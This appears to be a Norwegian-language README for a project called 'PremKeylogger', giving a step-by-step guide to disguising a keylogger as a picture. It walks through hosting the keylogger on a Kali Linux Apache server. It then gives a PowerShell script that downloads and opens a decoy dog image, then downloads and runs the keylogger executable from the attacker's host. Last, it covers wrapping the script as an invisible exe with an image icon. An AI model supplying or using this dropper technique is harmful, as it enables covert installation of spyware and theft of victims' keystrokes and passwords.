# PremKeylogger-ferdig

Verktøy:
-Hyper-V manager
-Winscp
-Kali linux
-bat to exe converter
-2 bilder
-1 ICO (ikon)

---------------------------------------------------------------------------------------------------------------------------------------------------------------|

Koden ble skrevet i Visual studio, hvordan du implenterer koden i et "bilde" er gjort i Kali Linux.

--------------------------------------------------------------------------------------------------------------------------------------------|

For å få "injecte" keyloggeren inn i et "bilde" må du lage apache2 web server for å lagre din keylogger inni den.

--------------------------------------------------------------------------------------------------------------------------------------------|

For å gjøre det trenger du Kali linux. Det er for å sette opp en Apache web server. Du må også overføre din keylogger
til din Kali linux. Du trenger "Winscp" for å gjøre dette.

--------------------------------------------------------------------------------------------------------------------------------------------|

For å sjekke at din Apache2 web server er oppe kan du skrive inn din kali linux sin ip adresse, kommando for å få ip adresse: "ip a".
Når du har Ip adressen skriver du inn i google chrome "http://DIN IP ADRESSE"

--------------------------------------------------------------------------------------------------------------------------------------------|

For å legge keylogger filen inn på din apache2 web server går du inn på kali linux:
-> "Open folder", øverst til venstre -> finn keyloggeren -> høyreklikk -> cut -> file system - Var -> www -> html -> høyreklikk -> paste.

--------------------------------------------------------------------------------------------------------------------------------------------|

Finn et passende bilde som har en URl som slutter på .png, .jpg eller .jpeg som for eksempel:
https://cdn.discordapp.com/attachments/669940183805984806/960943869988593764/20220405_184733.jpg
Så trenger vi URL til keyloggeren, du finner dette ved å gå inn på din Apache2 webs server, høyreklikke på filen -> Copy

--------------------------------------------------------------------------------------------------------------------------------------------|
Deretter gå inn på powershell på din vanlige pc. NB! gjør dette på notepad først. 
Skriv inn:
cd %TEMP%
Invoke-webRequest 'bilde URL' -OutFile passende navn.jpg
passende navn.png
Invoke-webRequest 'fil IRL' -OutFIle passende navn.exe (eller .bat)

--------------------------------------------------------------------------------------------------------------------------------------------|

Det kan se sånn ut:

cd %TEMP%
Invoke-webRequest 'https://cdn.discordapp.com/attachments/669940183805984806/960943869988593764/20220405_184733.jpg' -OutFile By.jpg
By.jpg
Invoke-webRequest 'http://192.168.50.221/S%c3%b8tHund.jpeg.exe' -OutFile SøtHund.jpeg.exe
SutHund.jpeg.exe

--------------------------------------------------------------------------------------------------------------------------------------------|

Lagre notepad filen der du kan finne den. Filtypen skal være "all files". Gi filen et passende navn som slutter på .exe. feks "SøtHunnd.exe".

--------------------------------------------------------------------------------------------------------------------------------------------|

Copy paste teksten på powershell, start den. Nå har vi en fil som gjør at hvis brukeren trykker på filen starter den programmet, ved at den installerer
et bilde, og hviser den. For å gi den et ikon trenger vi bat to exe converter. 
Dra filen inn på bat to exe converter -> Icon -> trykk på de 3 prikkene -> finn Ico filen -> exe format 32 bit | Windows (Invisible) -> Convert ->
navngi den et passende navn -> save

--------------------------------------------------------------------------------------------------------------------------------------------|

